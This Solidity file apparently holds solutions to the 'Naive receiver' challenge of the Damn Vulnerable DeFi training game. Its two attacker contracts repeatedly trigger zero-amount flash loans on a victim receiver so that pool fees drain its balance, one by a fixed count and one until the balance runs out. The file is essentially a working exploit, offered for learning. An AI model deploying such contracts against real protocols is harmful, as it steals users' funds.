// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/Address.sol";

/**
@title Flash Loan Attacker
@author kootsZhin
 */
contract FlashLoanAttacker {

    using Address for address;

    function attackBorrower(address pool, address victim, uint counter) external {
        require(pool.isContract(), "Pool must be a deployed contract");
        require(victim.isContract(), "Victim must be a deployed contract");
        for (uint i = 0; i < counter; i++) {
            pool.functionCall(
                abi.encodeWithSignature(
                    "flashLoan(address,uint256)",
                    victim,
                    0
                )
            );
            /**
             * Noted that when calling abi.encodeWithSignature, 
             * the function prototype of the signature string should not contain " "
             * e.g. "flashLoan(address, uint256)" will cause error in encoding
             */
        }
    }
}


/**
@title Naive-receiver Attack Contract
@author cmichel
@notice Clearer and more fool-proof solution to the problem.
 */
interface INaiveLendingPool {
  function fixedFee() external pure returns (uint256);
  function flashLoan(address borrower, uint256 borrowAmount) external;
}
contract BetterNaiveReceiverAttacker {
  function attack(INaiveLendingPool pool, address payable receiver) external {
    uint256 fee = pool.fixedFee();
    while (receiver.balance >= fee) {
      pool.flashLoan(receiver, 0);
    }
  }
}

/**
 * A more readable solution by the use of interface
 * Seen on: https://github.com/broccolirob/damn-vulnerable-defi/blob/fe5976abbc7c5556f15b3844034f4dfbe6a2d5a7/contracts/attacker-contracts/NaiveReceiverAttack.sol
 */